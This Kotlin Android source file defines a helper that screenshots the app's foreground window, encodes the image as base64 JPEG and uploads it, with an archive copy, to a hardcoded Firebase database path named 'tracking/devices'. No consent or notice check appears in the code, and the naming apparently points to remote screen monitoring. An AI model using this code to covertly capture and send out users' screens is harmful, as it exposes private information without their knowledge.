package com.hokimloyha.app.service

import android.app.Activity
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.PixelCopy
import com.google.firebase.database.FirebaseDatabase
import java.io.ByteArrayOutputStream

object ScreenCaptureHelper {
    private const val TAG = "ScreenCaptureHelper"

    fun captureScreenshot(context: Context, deviceId: String, callback: ((Boolean) -> Unit)? = null) {
        val activity = AppStateTracker.currentActivity
        if (activity == null || activity.isFinishing || activity.isDestroyed) {
            Log.w(TAG, "No active foreground activity for screenshot")
            callback?.invoke(false)
            return
        }

        try {
            val window = activity.window
            val view = window.decorView
            val width = if (view.width > 0) view.width else 720
            val height = if (view.height > 0) view.height else 1280

            val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
            val handler = Handler(Looper.getMainLooper())

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                PixelCopy.request(window, bitmap, { copyResult ->
                    if (copyResult == PixelCopy.SUCCESS) {
                        saveScreenshotToFirebase(bitmap, deviceId, callback)
                    } else {
                        Log.e(TAG, "PixelCopy failed with result: $copyResult")
                        callback?.invoke(false)
                    }
                }, handler)
            } else {
                @Suppress("DEPRECATION")
                view.isDrawingCacheEnabled = true
                @Suppress("DEPRECATION")
                val b = Bitmap.createBitmap(view.drawingCache)
                @Suppress("DEPRECATION")
                view.isDrawingCacheEnabled = false
                saveScreenshotToFirebase(b, deviceId, callback)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Screenshot error: ${e.message}", e)
            callback?.invoke(false)
        }
    }

    private fun saveScreenshotToFirebase(bitmap: Bitmap, deviceId: String, callback: ((Boolean) -> Unit)?) {
        try {
            // Hajmni maqbullashtirish (max 720p)
            var workingBmp = bitmap
            val maxDim = 800
            if (workingBmp.width > maxDim || workingBmp.height > maxDim) {
                val scale = maxDim.toFloat() / maxOf(workingBmp.width, workingBmp.height)
                val nw = (workingBmp.width * scale).toInt()
                val nh = (workingBmp.height * scale).toInt()
                workingBmp = Bitmap.createScaledBitmap(workingBmp, nw, nh, true)
            }

            val baos = ByteArrayOutputStream()
            workingBmp.compress(Bitmap.CompressFormat.JPEG, 65, baos)
            val bytes = baos.toByteArray()
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

            val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
            val mediaRef = database.getReference("tracking/devices/$deviceId/media")

            val now = System.currentTimeMillis()
            val item = mapOf(
                "type" to "image",
                "screen_base64" to base64,
                "timestamp" to now
            )

            mediaRef.child("latest_screen").setValue(item)
            mediaRef.child("archive_screen").push().setValue(item)
            mediaRef.child("status").setValue("📸 Ekran skrinshoti olindi ($now)")
            callback?.invoke(true)
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading screenshot", e)
            callback?.invoke(false)
        }
    }
}
